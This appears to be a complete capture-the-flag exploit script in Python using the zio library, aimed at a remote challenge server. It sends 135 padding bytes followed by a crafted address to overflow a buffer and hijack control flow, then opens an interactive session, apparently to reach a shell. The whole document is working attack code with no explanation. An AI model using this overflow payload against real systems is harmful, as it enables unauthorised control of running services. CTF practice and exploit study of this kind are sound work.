from zio import *

io = zio(('pwn.phrack.top', 9876), print_read=COLORED(RAW), print_write=COLORED(RAW, 'green'))

io.read_until("Input your message:")

io.write('A' * 135 + "\x01\x20\x06\x40\x00\x00\x00\x00\x00")

io.interact()
